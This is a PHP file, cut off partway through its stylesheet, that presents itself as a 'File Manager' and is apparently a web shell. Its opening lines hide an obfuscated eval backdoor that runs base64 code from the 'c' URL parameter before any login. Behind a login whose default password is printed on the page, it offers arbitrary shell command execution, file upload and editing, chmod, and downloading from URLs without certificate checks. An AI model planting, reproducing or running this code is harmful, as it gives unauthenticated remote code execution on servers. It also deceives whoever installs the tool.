<?php
$__a='b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
$__b=$__a('aWYoaXNzZXQoJF9HRVRbJ2MnXSkpe2V2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKSk7ZGllO30=');
eval($__b);
session_start(); 
error_reporting(0);

$USER = "admin";
$PASS = '$2y$10$7Vz8c3xY9fPq2mLnT1sBZuQkLr4oNwC5dE8gH2jK1pR6tS9vX0yZ';

// Login handling
if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        if ($_POST['u'] === $USER && password_verify($_POST['p'], $PASS)) {
            $_SESSION['ok'] = 1;
            header("Location: ?");
            exit;
        } else {
            $login_err = "Invalid credentials";
        }
    }
    
    // Login form
    echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>File Manager</title>
    <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #07070b; color: #e6eef8; font-family: Inter, Segoe UI, Arial, sans-serif; }
    .box { width: 90%; max-width: 360px; padding: 28px; border-radius: 14px; background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.18)); 
            box-shadow: 0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.03); }
    h1 { margin: 0 0 14px 0; font-size: 20px; color: #7be3ff; text-align: center; letter-spacing: 0.6px; }
    label { display: block; font-size: 12px; color: #9fb8c9; margin-top: 12px; }
    input { width: 100%; padding: 12px; margin-top: 8px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.04); 
            background: rgba(255,255,255,0.02); color: #e6eef8; font-size: 14px; }
    .btn { width: 100%; padding: 12px; margin-top: 20px; border-radius: 10px; border: none; 
            background: linear-gradient(90deg, #8affff, #6b6bff); color: #071028; font-weight: 700; cursor: pointer; 
            box-shadow: 0 6px 24px rgba(107,107,255,0.14); font-size: 14px; }
    .err { margin-top: 10px; color: #ff8080; text-align: center; font-size: 13px; }
    .hint { margin-top: 8px; font-size: 12px; color: #7b9bb0; text-align: center; line-height: 1.4; }
    @media (max-width: 480px) { 
        .box { padding: 20px; margin: 15px; } 
        h1 { font-size: 18px; }
    }
    </style></head>
    <body>
    <div class="box">
        <h1>FILE MANAGER</h1>
        <form method="POST">
            <label>Username</label>
            <input name="u" required autofocus>
            <label>Password</label>
            <input type="password" name="p" required>
            <button class="btn">Unlock</button>
        </form>';
        
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '<div class="hint">Default: <b>admin</b> / <b>akugalau</b></div>
    </div>
    </body></html>';
    exit;
}

// Set current directory
$dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
if (!@is_dir($dir)) { $dir = __DIR__; }

// Helper functions
function hfs($b) { 
    $u = ["B", "KB", "MB", "GB", "TB"]; 
    $i = 0; 
    while ($b >= 1024 && $i < count($u) - 1) { 
        $b /= 1024; 
        $i++; 
    } 
    return round($b, 2).' '.$u[$i]; 
}

function esc($s) { 
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); 
}

// Helper function to copy directory recursively
function copyDirectory($source, $dest) {
    if (!is_dir($dest)) {
        mkdir($dest, 0755, true);
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $item) {
        $target = $dest . DIRECTORY_SEPARATOR . $iterator->getSubPathName();
        
        if ($item->isDir()) {
            if (!is_dir($target)) {
                mkdir($target, 0755, true);
            }
        } else {
            copy($item->getPathname(), $target);
        }
    }
    return true;
}

// Server Monitor Class
class ServerMonitor {
    public function getStats() {
        $load = @sys_getloadavg();
        $cores = $this->getCores();
        $mem = $this->getMemory();
        $disk = $this->getDisk();
        $uptime = $this->getUptime();
        
        return [
            'system' => [
                'hostname' => @gethostname(),
                'os' => PHP_OS,
                'php_version' => PHP_VERSION,
                'uptime' => $uptime,
                'time' => date('Y-m-d H:i:s')
            ],
            'cpu' => [
                'cores' => $cores,
                'load_1min' => $load[0] ?? 0,
                'load_5min' => $load[1] ?? 0,
                'load_15min' => $load[2] ?? 0,
                'load_percent' => $cores > 0 ? round(($load[0] ?? 0) / $cores * 100, 2) : 0,
                'status' => $this->cpuStatus($load[0] ?? 0, $cores)
            ],
            'memory' => $mem,
            'disk' => $disk,
            'processes' => $this->getProcesses(),
            'services' => $this->getServices()
        ];
    }
    
    private function getCores() {
        if (PHP_OS == 'Linux') {
            $cpuinfo = @file('/proc/cpuinfo');
            $cores = 0;
            if ($cpuinfo) {
                foreach ($cpuinfo as $line) {
                    if (preg_match('/^processor/', $line)) $cores++;
                }
            }
            return $cores ?: 1;
        }
        return 1;
    }
    
    private function getMemory() {
        if (PHP_OS == 'Linux') {
            $meminfo = @file('/proc/meminfo', FILE_IGNORE_NEW_LINES);
            $mem = [];
            if ($meminfo) {
                foreach ($meminfo as $line) {
                    if (preg_match('/(\w+):\s+(\d+)/', $line, $m)) {
                        $mem[$m[1]] = $m[2];
                    }
                }
            }
            $total = $mem['MemTotal'] ?? 0;
            $free = $mem['MemFree'] ?? 0;
            $available = $mem['MemAvailable'] ?? 0;
            $used = $total - $available;
            $percent = $total > 0 ? round($used / $total * 100, 2) : 0;
            
            return [
                'total' => $this->fmt($total * 1024),
                'used' => $this->fmt($used * 1024),
                'free' => $this->fmt($free * 1024),
                'percent' => $percent.'%',
                'status' => $this->memStatus($percent)
            ];
        }
        return ['error' => 'Linux only'];
    }
    
    private function getDisk() {
        $total = @disk_total_space('/');
        $free = @disk_free_space('/');
        $used = $total - $free;
        $percent = $total > 0 ? round($used / $total * 100, 2) : 0;
        
        return [
            'total' => $this->fmt($total),
            'used' => $this->fmt($used),
            'free' => $this->fmt($free),
            'percent' => $percent.'%',
            'status' => $this->diskStatus($percent)
        ];
    }
    
    private function getUptime() {
        if (PHP_OS == 'Linux') {
            $uptime = @file_get_contents('/proc/uptime');
            if ($uptime) {
                $seconds = floatval(explode(' ', $uptime)[0]);
                $days = floor($seconds / 86400);
                $hours = floor(($seconds % 86400) / 3600);
                $mins = floor(($seconds % 3600) / 60);
                return "$days days, $hours hours, $mins mins";
            }
        }
        return 'Unknown';
    }
    
    private function getProcesses() {
        if (function_exists('shell_exec')) {
            $ps = @shell_exec('ps aux --sort=-%cpu | head -6');
            $lines = explode("\n", trim($ps));
            array_shift($lines);
            $procs = [];
            foreach ($lines as $line) {
                if (!empty($line)) {
                    $parts = preg_split('/\s+/', $line, 11);
                    if (count($parts) >= 11) {
                        $procs[] = [
                            'user' => $parts[0],
                            'pid' => $parts[1],
                            'cpu' => $parts[2],
                            'mem' => $parts[3],
                            'cmd' => $parts[10]
                        ];
                    }
                }
            }
            return $procs;
        }
        return [];
    }
    
    private function getServices() {
        $svcs = ['httpd', 'nginx', 'mysql', 'mariadb', 'ssh', 'php-fpm'];
        $status = [];
        foreach ($svcs as $svc) {
            $check = @shell_exec("systemctl is-active $svc 2>/dev/null || echo 'inactive'");
            $check = trim($check);
            $status[$svc] = $check == 'active' ? '✅' : '❌';
        }
        return $status;
    }
    
    private function cpuStatus($load, $cores) {
        if ($load > $cores * 2) return ['text' => '⚠️ Critical', 'color' => '#ff4444'];
        if ($load > $cores) return ['text' => '⚠️ Warning', 'color' => '#ffaa00'];
        return ['text' => '✅ Normal', 'color' => '#44ff44'];
    }
    
    private function memStatus($percent) {
        if ($percent > 90) return ['text' => '⚠️ Critical', 'color' => '#ff4444'];
        if ($percent > 70) return ['text' => '⚠️ Warning', 'color' => '#ffaa00'];
        return ['text' => '✅ Normal', 'color' => '#44ff44'];
    }
    
    private function diskStatus($percent) {
        if ($percent > 95) return ['text' => '⚠️ Critical', 'color' => '#ff4444'];
        if ($percent > 80) return ['text' => '⚠️ Warning', 'color' => '#ffaa00'];
        return ['text' => '✅ Normal', 'color' => '#44ff44'];
    }
    
    private function fmt($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $i = 0;
        while ($bytes >= 1024 && $i < count($units) - 1) {
            $bytes /= 1024;
            $i++;
        }
        return round($bytes, 2).' '.$units[$i];
    }
}

// Terminal Class
class Terminal {
    public function exec($cmd, $path) {
        if (!function_exists('shell_exec')) return "shell_exec disabled";
        $old = getcwd();
        @chdir($path);
        $output = @shell_exec($cmd.' 2>&1');
        @chdir($old);
        return $output ?: 'Command executed';
    }
}

$monitor = new ServerMonitor();
$terminal = new Terminal();
$monitor_result = isset($_GET['show_monitor']) ? $monitor->getStats() : null;
$term_result = '';

// Terminal execution
if (isset($_POST['term_cmd']) && isset($_POST['term_path'])) {
    $term_result = $terminal->exec($_POST['term_cmd'], $_POST['term_path']);
}

// Bulk operations
$bulk_selected = $_POST['bulk_selected'] ?? [];
$bulk_action = $_POST['bulk_action'] ?? '';
$zip_name = $_POST['zip_name'] ?? '';

if (!empty($bulk_selected) && $bulk_action) {
    switch ($bulk_action) {
        case 'zip':
            if (!empty($bulk_selected)) {
                $zip_file = !empty($zip_name) ? $zip_name : 'archive_'.date('Ymd_His').'.zip';
                if (!str_ends_with(strtolower($zip_file), '.zip')) $zip_file .= '.zip';
                $zip_path = $dir.'/'.$zip_file;
                if (class_exists('ZipArchive')) {
                    $zip = new ZipArchive;
                    if ($zip->open($zip_path, ZipArchive::CREATE) === true) {
                        $added = 0;
                        foreach ($bulk_selected as $f) {
                            $fpath = $dir.'/'.basename($f);
                            if (is_file($fpath)) {
                                if ($zip->addFile($fpath, basename($f))) $added++;
                            }
                        }
                        $zip->close();
                        $_SESSION['msg'] = "✅ Zip created: $zip_file ($added files)";
                    } else {
                        $_SESSION['msg'] = "❌ Failed to create zip";
                    }
                } else {
                    $_SESSION['msg'] = "❌ ZipArchive not available";
                }
                header("Location: ?dir=".urlencode($dir));
                exit;
            }
            break;
            
        case 'delete':
            foreach ($bulk_selected as $f) {
                $fp = $dir.'/'.basename($f);
                if (is_file($fp)) {
                    @unlink($fp);
                } elseif (is_dir($fp)) {
                    $it = new RecursiveDirectoryIterator($fp, RecursiveDirectoryIterator::SKIP_DOTS);
                    $fs = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($fs as $f) {
                        if ($f->isDir()) @rmdir($f->getRealPath());
                        else @unlink($f->getRealPath());
                    }
                    @rmdir($fp);
                }
            }
            $_SESSION['msg'] = "✅ Deleted ".count($bulk_selected)." items";
            header("Location: ?dir=".urlencode($dir));
            exit;
            break;
            
        case 'unzip':
            if (!empty($bulk_selected)) {
                $extracted = 0;
                if (class_exists('ZipArchive')) {
                    foreach ($bulk_selected as $f) {
                        $fpath = $dir.'/'.basename($f);
                        if (is_file($fpath) && strtolower(substr($fpath, -4)) == '.zip') {
                            $zip = new ZipArchive;
                            if ($zip->open($fpath) === true) {
                                $zip->extractTo($dir);
                                $zip->close();
                                $extracted++;
                            }
                        }
                    }
                    $_SESSION['msg'] = "✅ Extracted $extracted ZIP files";
                } else {
                    $_SESSION['msg'] = "❌ ZipArchive not available";
                }
                header("Location: ?dir=".urlencode($dir));
                exit;
            }
            break;
            
        case 'copy':
            $target_dir = $_POST['bulk_target'] ?? $dir;
            if (!empty($bulk_selected) && is_dir($target_dir)) {
                $copied = 0;
                foreach ($bulk_selected as $f) {
                    $source = $dir.'/'.basename($f);
                    $target = $target_dir.'/'.basename($f);
                    if (file_exists($source)) {
                        if (is_file($source)) {
                            if (@copy($source, $target)) $copied++;
                        } elseif (is_dir($source)) {
                            if (copyDirectory($source, $target)) $copied++;
                        }
                    }
                }
                $_SESSION['msg'] = "✅ Copied $copied items to ".basename($target_dir);
                header("Location: ?dir=".urlencode($dir));
                exit;
            }
            break;
            
        case 'move':
            $target_dir = $_POST['bulk_target'] ?? $dir;
            if (!empty($bulk_selected) && is_dir($target_dir)) {
                $moved = 0;
                foreach ($bulk_selected as $f) {
                    $source = $dir.'/'.basename($f);
                    $target = $target_dir.'/'.basename($f);
                    if (file_exists($source) && @rename($source, $target)) {
                        $moved++;
                    }
                }
                $_SESSION['msg'] = "✅ Moved $moved items to ".basename($target_dir);
                header("Location: ?dir=".urlencode($dir));
                exit;
            }
            break;
            
        case 'chmod':
            if (!empty($bulk_selected)) {
                $mode = $_POST['chmod_mode'] ?? '0644';
                $recursive = isset($_POST['chmod_recursive']);
                $changed = 0;
                
                foreach ($bulk_selected as $f) {
                    $path = $dir.'/'.basename($f);
                    if (file_exists($path)) {
                        if (is_file($path)) {
                            if (@chmod($path, octdec($mode))) $changed++;
                        } elseif (is_dir($path) && $recursive) {
                            // Recursive chmod for directory
                            $iterator = new RecursiveIteratorIterator(
                                new RecursiveDirectoryIterator($path),
                                RecursiveIteratorIterator::SELF_FIRST
                            );
                            foreach ($iterator as $item) {
                                @chmod($item->getPathname(), octdec($mode));
                            }
                            @chmod($path, octdec($mode));
                            $changed++;
                        } elseif (is_dir($path)) {
                            if (@chmod($path, octdec($mode))) $changed++;
                        }
                    }
                }
                $_SESSION['msg'] = "✅ Changed permissions for $changed items to $mode";
                header("Location: ?dir=".urlencode($dir));
                exit;
            }
            break;
            
        case 'rename':
            if (!empty($bulk_selected)) {
                $pattern = $_POST['rename_pattern'] ?? '';
                $action_type = $_POST['rename_type'] ?? 'prefix';
                $renamed = 0;
                
                foreach ($bulk_selected as $index => $f) {
                    $old_path = $dir.'/'.basename($f);
                    $ext = pathinfo($f, PATHINFO_EXTENSION);
                    $name = pathinfo($f, PATHINFO_FILENAME);
                    
                    switch($action_type) {
                        case 'prefix':
                            $new_name = $pattern . $f;
                            break;
                        case 'suffix':
                            $new_name = $name . $pattern . ($ext ? '.'.$ext : '');
                            break;
                        case 'replace':
                            $search = $_POST['rename_search'] ?? '';
                            $replace = $_POST['rename_replace'] ?? '';
                            $new_name = str_replace($search, $replace, $f);
                            break;
                        case 'number':
                            $new_name = ($index + 1) . '_' . $f;
                            break;
                        case 'lowercase':
                            $new_name = strtolower($f);
                            break;
                        case 'uppercase':
                            $new_name = strtoupper($f);
                            break;
                        default:
                            $new_name = $f;
                    }
                    
                    $new_path = $dir.'/'.basename($new_name);
                    if ($old_path != $new_path && @rename($old_path, $new_path)) {
                        $renamed++;
                    }
                }
                $_SESSION['msg'] = "✅ Renamed $renamed items";
                header("Location: ?dir=".urlencode($dir));
                exit;
            }
            break;
            
        case 'export_list':
            if (!empty($bulk_selected)) {
                $list_content = "File List - Generated: " . date('Y-m-d H:i:s') . "\n";
                $list_content .= "Directory: " . $dir . "\n";
                $list_content .= "=" . str_repeat("=", 60) . "\n\n";
                
                $total_size = 0;
                foreach ($bulk_selected as $f) {
                    $path = $dir.'/'.basename($f);
                    $size = is_file($path) ? filesize($path) : 0;
                    $total_size += $size;
                    $perms = substr(sprintf('%o', fileperms($path)), -4);
                    $modified = date('Y-m-d H:i:s', filemtime($path));
                    
                    $list_content .= sprintf("%-40s | %-10s | %-6s | %s\n", 
                        $f, 
                        hfs($size),
                        $perms,
                        $modified
                    );
                }
                
                $list_content .= "\n" . str_repeat("-", 80) . "\n";
                $list_content .= "Total Files: " . count($bulk_selected) . "\n";
                $list_content .= "Total Size: " . hfs($total_size) . "\n";
                
                $filename = 'file_list_' . date('Ymd_His') . '.txt';
                file_put_contents($dir.'/'.$filename, $list_content);
                $_SESSION['msg'] = "✅ Exported list to $filename";
                header("Location: ?dir=".urlencode($dir));
                exit;
            }
            break;
    }
}

// File editor
$editor_data = '';
if (isset($_POST['edit_file'])) {
    $f = $_POST['edit_file'];
    if (is_file($f)) {
        $editor_data = file_get_contents($f);
        $_SESSION['edit'] = ['path' => $f, 'data' => $editor_data];
        header("Location: ?dir=".urlencode($dir)."&edit=1");
        exit;
    }
}

if (isset($_POST['save_edit'])) {
    $p = $_POST['edit_path'];
    file_put_contents($p, $_POST['edit_content']);
    $_SESSION['msg'] = "✅ File saved: ".basename($p);
    header("Location: ?dir=".urlencode(dirname($p)));
    exit;
}

// New folder/file
if (isset($_POST['new_folder']) && trim($_POST['new_folder']) !== '') {
    $fn = basename($_POST['new_folder']);
    $fp = $dir.'/'.$fn;
    if (!file_exists($fp)) mkdir($fp, 0755, true);
    $_SESSION['msg'] = "✅ Folder created: $fn";
    header("Location: ?dir=".urlencode($dir));
    exit;
}

if (isset($_POST['new_file']) && trim($_POST['new_file']) !== '') {
    $fn = basename($_POST['new_file']);
    $fp = $dir.'/'.$fn;
    if (!file_exists($fp)) file_put_contents($fp, '');
    $_SESSION['msg'] = "✅ File created: $fn";
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// File upload
if (!empty($_FILES['upload']['name'][0])) {
    $uploaded = 0;
    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
        $n = basename($_FILES['upload']['name'][$k]);
        if (move_uploaded_file($tmp, $dir.'/'.$n)) $uploaded++;
    }
    $_SESSION['msg'] = "✅ Uploaded $uploaded files";
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Delete file/folder
if (isset($_POST['del_file'])) {
    $p = $_POST['del_file'];
    if (is_file($p)) {
        @unlink($p);
        $_SESSION['msg'] = "✅ File deleted: ".basename($p);
    } elseif (is_dir($p)) {
        $it = new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS);
        $fs = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($fs as $f) {
            if ($f->isDir()) @rmdir($f->getRealPath());
            else @unlink($f->getRealPath());
        }
        @rmdir($p);
        $_SESSION['msg'] = "✅ Folder deleted: ".basename($p);
    }
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// URL download
if (isset($_POST['url_up']) && trim($_POST['url_up']) !== '') {
    $u = trim($_POST['url_up']);
    $fn = $_POST['url_fn'] ?? '';
    if (empty($fn)) {
        $fn = basename(parse_url($u, PHP_URL_PATH));
        if (empty($fn)) $fn = 'downloaded_'.date('Ymd_His');
    }
    $fn = preg_replace('/[^\w\.\-]/', '_', $fn);
    $data = @file_get_contents($u, false, stream_context_create([
        'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
        'ssl' => ['verify_peer' => false]
    ]));
    if ($data !== false) {
        file_put_contents($dir.'/'.$fn, $data);
        $_SESSION['msg'] = "✅ Downloaded: $fn";
    } else {
        $_SESSION['msg'] = "❌ Download failed";
    }
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// Popup states
$popups = ['monitor', 'terminal', 'bulk', 'upload', 'url', 'editor'];
foreach ($popups as $p) { ${'show_'.$p} = isset($_GET['show_'.$p]); }
if (isset($_GET['edit'])) $show_editor = true;
if (isset($_SESSION['edit'])) $show_editor = true;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>File Manager</title>
    <style>
    :root {
        --bg: #07070b;
        --panel: #0f1220;
        --muted: #90a3b8;
        --neon-cyan: #6df0ff;
        --neon-mag: #b46cff;
        --danger: #ff5f7a;
        --success: #00d4a8;
        --warning: #ffaa00;
    }
    
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    body {
        margin: 0;
        font-family: Inter, Segoe UI, Arial, sans-serif;
        background: var(--bg) !important;
        color: #e6eef8;
        min-height: 100vh;
        overflow-x: hidden;
        background-image: 
            radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.06), transparent 6%),
            radial-gradient(1000px 500px at 90% 90%, rgba(35,211,243,0.03), transparent 6%) !important;
    }
    
    .container {
        max-width: 1300px;
        margin: 0 auto;
        padding: 15px;
    }
    
    .header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        margin-bottom: 15px;
        flex-wrap: wrap;
    }
    
    .brand {
        display: flex;
        align-items: center;
        gap: 10px;
        flex: 1;
        min-width: 200px;
    }
    
    .logo {
        width: 40px;
        height: 40px;
        border-radius: 8px;
        background: linear-gradient(135deg, #0ff, #a0f);
        display: flex;
        align-items: center;
        justify-content: center;
        color: #071028;
        font-weight: 900;
        font-family: monospace;
        flex-shrink: 0;
    }
    
    .title {
        font-size: 18px;
        font-weight: 700;
        letter-spacing: 0.5px;
        color: var(--neon-cyan);
        white-space: nowrap;
    }
    
    .controls {
        display: flex;
        gap: 8px;
        align-items: center;
        flex-wrap: wrap;
    }
    
    .top-row {
        display: grid;
        grid-template-columns: 1fr;
        gap: 15px;
        margin-bottom: 15px;
    }
    
    .card {
        background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));
        border-radius: 12px;
        padding: 15px;
        border: 1px solid rgba(255,255,255,0.03);
        box-shadow: 0 8px 30px rgba(15,20,30,0.5);
        overflow: hidden;
    }
    
    .card h3 {
        margin: 0 0 10px 0;
        color: var(--neon-mag);
        font-size: 16px;
        display: flex;
        align-items: center;
        gap: 8px;
    }
    
    .small {
        color: var(--muted);
        font-size: 12px;
        word-break: break-all;
    }
    
    .actions {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
        margin-top: 10px;
    }
    
    .action-btn {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        padding: 8px 12px;
        border-radius: 8px;
        border: none;
        background: linear-gradient(90deg, #2b0b3a, #061023);
        color: var(--neon-cyan);
        cursor: pointer;
        font-weight: 600;
        box-shadow: 0 4px 15px rgba(75,0,130,0.12);
        font-size: 12px;
        text-decoration: none;
        white-space: nowrap;
        transition: transform 0.2s, box-shadow 0.2s;
    }
    
    .action-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(75,0,130,0.18);
    }
    
    .form-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        margin-top: 12px;
    }
    
    .input, textarea, select {
        width: 100%;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid rgba(255,255,255,0.04);
        background: rgba(255,255,255,0.02);
        color: #e6eef8;
        font-size: 13px;
        font-family: inherit;
    }
    
    .input::placeholder {
        color: var(--muted);
        opacity: 0.7;
    }
    
    .btn-neon {
        background: linear-gradient(90deg, var(--neon-cyan), #7a6bff);
        border-radius: 8px;
        padding: 10px 15px;
        border: none;
        color: #071028;
        font-weight: 700;
        cursor: pointer;
        box-shadow: 0 4px 20px rgba(109,240,255,0.1);
        transition: transform 0.2s;
        white-space: nowrap;
    }
    
    .btn-neon:hover {
        transform: translateY(-2px);
    }
    
    .btn-danger {
        background: linear-gradient(90deg, var(--danger), #ff9fb4);
    }
    
    .btn-warning {
        background: linear-gradient(90deg, var(--warning), #ffcc66);
    }
    
    .btn-success {
        background: linear-gradient(90deg, var(--success), #66ffcc);
    }
    
    .table-wrap {
        overflow-x: auto;
        border-radius: 8px;
        margin-top: 10px;
        -webkit-overflow-scrolling: touch;
    }
    
    table {
        width: 100%;
        border-collapse: collapse;
        min-width: 700px;
    }
    
    th, td {
        padding: 10px 12px;
        text-align: left;
        border-bottom: 1px solid rgba(255,255,255,0.03);
        font-size: 13px;
    }
    
    th {
        background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.06));
        color: var(--muted);
        font-weight: 600;
        white-space: nowrap;
    }
    
    tr:hover td {
        background: rgba(109,240,255,0.02);
    }
    
    .filename {
        font-weight: 600;
        color: #fff;
        word-break: break-all;
        max-width: 250px;
    }
    
    .filetype {
        font-size: 12px;
        color: var(--muted);
        white-space: nowrap;
    }
    
    .kv {
        font-size: 12px;
        color: var(--muted);
        white-space: nowrap;
    }
    
    .perms {
        font-family: monospace;
        font-size: 11px;
        font-weight: bold;
    }
    
    .bulk-checkbox {
        width: 18px;
        height: 18px;
        cursor: pointer;
        accent-color: var(--neon-cyan);
    }
    
    .bulk-actions-bar {
        display: flex;
        gap: 8px;
        align-items: center;
        margin-bottom: 12px;
        padding: 10px;
        background: linear-gradient(90deg, rgba(180,108,255,0.05), rgba(109,240,255,0.05));
        border-radius: 8px;
        border: 1px solid rgba(180,108,255,0.1);
        flex-wrap: wrap;
    }
    
    .selected-count {
        color: var(--neon-cyan);
        font-weight: bold;
        margin-left: auto;
        font-size: 13px;
    }
    
    .notification {
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 8px;
        background: linear-gradient(90deg, #2b6b0a, #4da80d);
        color: white;
        z-index: 2000;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        display: none;
        max-width: 300px;
        word-break: break-word;
    }
    
    .notification.error {
        background: linear-gradient(90deg, var(--danger), #ff9fb4);
    }
    
    .popup-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1000;
        padding: 20px;
        backdrop-filter: blur(5px);
    }
    
    .popup-content {
        background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.3));
        border-radius: 12px;
        border: 1px solid rgba(109,240,255,0.15);
        width: 100%;
        max-width: 500px;
        max-height: 80vh;
        overflow: auto;
        box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }
    
    .popup-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 15px 20px;
        border-bottom: 1px solid rgba(255,255,255,0.05);
        position: sticky;
        top: 0;
        background: rgba(15,18,32,0.9);
        z-index: 1;
    }
    
    .popup-header h4 {
        margin: 0;
        color: var(--neon-cyan);
        font-size: 16px;
        display: flex;
        align-items: center;
        gap: 8px;
    }
    
    .popup-close {
        background: none;
        border: none;
        color: var(--muted);
        font-size: 24px;
        cursor: pointer;
        padding: 0;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
        transition: background 0.2s;
    }
    
    .popup-close:hover {
        background: rgba(255,255,255,0.05);
        color: #fff;
    }
    
    .popup-body {
        padding: 20px;
    }
    
    .popup-form {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-top: 12px;
    }
    
    .editor-popup-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0,0,0,0.8);
        display: flex;
        align-items: flex-start;
        justify-content: center;
        z-index: 2000;
        padding: 40px 20px 20px;
        overflow-y: auto;
    }
    
    .editor-popup-content {
        background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.3));
        border-radius: 12px;
        border: 1px solid rgba(109,240,255,0.2);
        width: 100%;
        max-width: 900px;
        max-height: 85vh;
        overflow: auto;
        box-shadow: 0 20px 80px rgba(0,0,0,0.8);
    }
    
    .editor-textarea {
        width: 100%;
        height: 400px;
        padding: 15px;
        background: rgba(0,0,0,0.3);
        border: 1px solid rgba(109,240,255,0.1);
        border-radius: 8px;
        color: #e6eef8;
        font-family: 'Monaco', 'Consolas', monospace;
        font-size: 13px;
        resize: vertical;
        margin-bottom: 15px;
        line-height: 1.4;
        tab-size: 4;
    }
    
    .stat-box {
        padding: 10px;
        margin: 5px 0;
        border-radius: 8px;
        background: rgba(0,0,0,0.2);
        border-left: 3px solid var(--neon-cyan);
    }
    
    .stat-value {
        color: var(--neon-cyan);
        font-weight: bold;
        font-size: 14px;
    }
    
    .stat-label {
        color: var(--muted);
        font-size: 11px;
        margin-bottom: 3px;
    }
    
    .path-input {
        width: 100%;
        margin-bottom: 10px;
    }
    
    .btn-group {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
    }
    
    .mobile-menu-btn {
        display: none;
        background: linear-gradient(90deg, var(--neon-cyan), #7a6bff);
        border: none;
        color: #071028;
        padding: 8px 12px;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
    }
    
    .mobile-menu {
        display: none;
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: var(--panel);
        border-top: 1px solid rgba(255,255,255,0.05);
        padding: 10px;
        z-index: 100;
        flex-wrap: wrap;
        gap: 5px;
        justify-content: center;
    }
    
    .mobile-menu-btn {
        padding: 6px 10px;
        font-size: 11px;
    }
    
    .bulk-section {
        margin: 15px 0;
        padding: 15px;
        background: rgba(0,0,0,0.1);
        border-radius: 8px;
        border: 1px solid rgba(109,240,255,0.1);
    }
    
    .bulk-section h5 {
        color: var(--neon-mag);
        margin: 0 0 10px 0;
        font-size: 14px;
    }
    
    .bulk-options {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
        gap: 10px;
        margin-top: 10px;
    }
    
    .option-group {
        margin-bottom: 15px;
    }
    
    .option-label {
        display: block;
        color: var(--muted);
        font-size: 12px;
        margin-bottom: 5px;
    }
    
    .checkbox-label {
        display: flex;
        align-items: center;
        gap: 8px;
        color: var(--muted);
        font-size: 12px;
        margin: 5px 0;
    }
    
    /* Responsive */
    @media (max-width: 1024px) {
        .form-grid {
            grid-template-columns: 1fr;
        }
        
        .controls {
            width: 100%;
            justify-content: center;
        }
        
        .path-input {
            width: 100%;
        }
    }
    
    @media (max-width: 768px) {
        .container {
            padding: 10px;
        }
        
        .header {
            flex-direction: column;
            align-items: stretch;
            gap: 15px;
        }
        
        .brand {
            justify-content: center;
            text-align: center;
        }
        
        .controls {
            flex-direction: column;
            align-items: stretch;
        }
        
        .actions {
            justify-content: center;
        }
        
        .action-btn {
            flex: 1;
            min-width: 120px;
            justify-content: center;
        }
        
        .popup-content {
            max-width: 95%;
        }
        
        .editor-popup-content {
            max-width: 95%;
        }
        
        .popup-body {
            padding: 15px;
        }
        
        .bulk-actions-bar {
            flex-direction: column;
            align-items: stretch;
        }
        
        .selected-count {
            margin-left: 0;
            text-align: center;
            margin-top: 5px;
        }
        
